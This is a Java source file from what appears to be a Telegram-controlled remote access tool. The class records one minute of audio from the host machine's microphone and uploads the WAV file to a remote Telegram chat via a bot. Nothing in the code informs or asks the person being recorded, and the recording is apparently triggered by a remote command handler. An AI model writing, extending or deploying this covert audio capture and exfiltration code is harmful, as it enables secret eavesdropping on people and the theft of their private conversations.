package me.Elitcody;

import javax.sound.sampled.*;

import com.pengrad.telegrambot.TelegramBot;
import com.pengrad.telegrambot.TelegramBotAdapter;
import com.pengrad.telegrambot.model.Message;
import com.pengrad.telegrambot.model.Update;
import com.pengrad.telegrambot.request.GetUpdates;
import com.pengrad.telegrambot.request.SendAudio;
import com.pengrad.telegrambot.response.GetUpdatesResponse;

import java.io.*;
import java.util.List;

public class microphonehandler {
	static final long RECORD_TIME = 60000;  // 1 minute
	   
	static File pathFile = new File(main.baseDIRECTORY+"/RecordAudio.wav");
	 
	static AudioFileFormat.Type fileType = AudioFileFormat.Type.WAVE;
	 
	static TargetDataLine line;
	   static AudioFormat getAudioFormat() {
	        float sampleRate = 16000;
	        int sampleSizeInBits = 8;
	        int channels = 2;
	        boolean signed = true;
	        boolean bigEndian = true;
	        AudioFormat format = new AudioFormat(sampleRate, sampleSizeInBits,
	                                             channels, signed, bigEndian);
	        return format;
	    }
	 
	static void finish() {
        line.stop();
        line.close();
        System.out.println("Finished");
    }
 
	
	 static void start() {
	        try {
	            AudioFormat format = getAudioFormat();
	            DataLine.Info info = new DataLine.Info(TargetDataLine.class, format);
	 
	            if (!AudioSystem.isLineSupported(info)) {
	                System.out.println("Line not supported");
	                System.exit(0);
	            }
	            line = (TargetDataLine) AudioSystem.getLine(info);
	            line.open(format);
	            line.start();   // start capturing
	 
	            System.out.println("Start capturing...");
	 
	            AudioInputStream ais = new AudioInputStream(line);
	 
	            System.out.println("Start recording...");
	 
	            // start recording
	            AudioSystem.write(ais, fileType, pathFile);
	 
	        } catch (LineUnavailableException ex) {
	            ex.printStackTrace();
	        } catch (IOException ioe) {
	            ioe.printStackTrace();
	        }
	    }
	public static void sendAudio()
	{
		final TelegramBot bot = TelegramBotAdapter.build("TOKENAPI");
		int chatId = CHATID;
		SendAudio audio = new SendAudio(chatId, pathFile);
		
		bot.execute(audio);
	}
	public static void inizializate()
	{
        Thread stopper = new Thread(new Runnable() {
            public void run() {
                try {
                    Thread.sleep(RECORD_TIME);
                } catch (InterruptedException ex) {
                    ex.printStackTrace();
                }
    			final TelegramBot bot = TelegramBotAdapter.build("TOKENAPI");
    			int chatId = CHATID;
                main.sendMsg(bot, chatId, "Ecco a lei: ");
                finish();
                cmdhandler.isrecording=false;
                sendAudio();
            }
        });
 
        stopper.start();
 
        // start recording
        start();
	}
}
